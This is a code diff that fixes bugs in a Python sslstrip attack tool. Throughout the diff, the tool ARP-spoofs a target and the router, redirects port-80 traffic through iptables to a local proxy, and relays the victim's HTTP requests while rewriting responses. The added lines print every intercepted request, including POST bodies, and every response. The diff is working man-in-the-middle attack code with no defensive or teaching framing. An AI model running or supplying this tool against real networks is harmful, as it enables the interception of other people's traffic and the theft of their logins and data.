@@ -1,5 +1,5 @@
 from scapy.all import *
-import arp
+from arp import *
 from helper import *
 import traceback
 import re
@@ -15,19 +15,21 @@ class sslstrip:
         self.interface = interface
         self.redirect_port = 8080
         
-    def set_iptables(toRunning):
+    def set_iptables(self, toRunning):
         if toRunning:
             os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
             run_iptables_command("iptables -t nat -I PREROUTING 1 -p tcp --dport 80 -j REDIRECT --to-port %s" % self.redirect_port)
         else:
             os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-            run_ip_tables_command("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port %s" % self.redirect_port)
+            run_iptables_command("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port %s" % self.redirect_port)
 
     class HTTPStrippingProxy(BaseHTTPRequestHandler):
         def do_GET(self):
+            print("Received GET")
             self.handle_request()
             
         def do_POST(self):
+            print("Received POST")
             self.handle_request()
             
         def handle_request(self):
@@ -43,8 +45,10 @@ class sslstrip:
                 port = 80 if len(splitted_host) == 1 else int(splitted_host[1])
                 
                 # connect to server
-                socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                socket.connect((host, port))
+                skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                skt.connect((host, port))
+                
+                print("Opened socket with '%s:%s'" % (host, port))
                 
                 # creafe request
                 self.headers['accept-Encoding'] = ''
@@ -52,23 +56,31 @@ class sslstrip:
                 request = "%s %s %s\r\n%s\r\n\r\n" % (self.command, self.path, self.request_version, headers)
                 
                 if self.command == 'POST':
-                    length = int(self.headers.get('Content-Length', 0)
+                    length = int(self.headers.get('Content-Length', 0))
                     data = self.rfile.read(length)
                     request += data
                 
-                # send request
-                socket.sendall(request)
+                print("--------------------------\nRequest: \n%s\n-----------------------------------" % request)
                 
+                
+                # send request
+                skt.sendall(request)
+                print("Send request")
                 # receive response
                 response = ""
+                i = 0
                 
                 while True:
-                    chunk = socket.recv(4096)
+                    i += 1
+                    chunk = skt.recv(4096)
+                    print("\n.......................\nchunk %d: '%s'\n.............................." % (i, chunk))
                     if not chunk:
                         break
                     response += chunk
                 
-                socket.close()
+                skt.close()
+                
+                print("+++++++++++++++++++++++++\nResponse: \n%s\n+++++++++++++++++++++++++" % response)
                 
                 # Process response and return to victim
                 self.wfile.write(self.process_response(response))
@@ -85,10 +97,10 @@ class sslstrip:
             status = lines[0]
                 
             for i, line in enumerate(lines):
-                if line == ''
+                if line == '':
                     end_of_header = i
                     break
-            if not end_of_header;
+            if not end_of_header:
                 return response
                     
             headers = lines[1:end_of_header]
@@ -133,7 +145,8 @@ class sslstrip:
             conf.route.resync()
             router_ip = conf.route.route("0.0.0.0")[2]
             arp1 = arp()
-            arp1.two_way_spoof(self.target_ip, router_ip, 2, self.interface)
+            thread = threading.Thread(target=arp1.two_way_arp_spoof, args=(self.target_ip, router_ip, 2, self.interface))
+            thread.start()
             
             self.set_iptables(True)
             self.start_http_proxy()
@@ -143,7 +156,8 @@ class sslstrip:
             if self.http_server:
                 self.http_server.shutdown()
             self.set_iptables(False)
-            arp1.stop_two_way_spoof()
+            arp1.stop_spoof()
+            thread.join()
         except Exception as e:
             print("An error occured")
             traceback.print_exc()
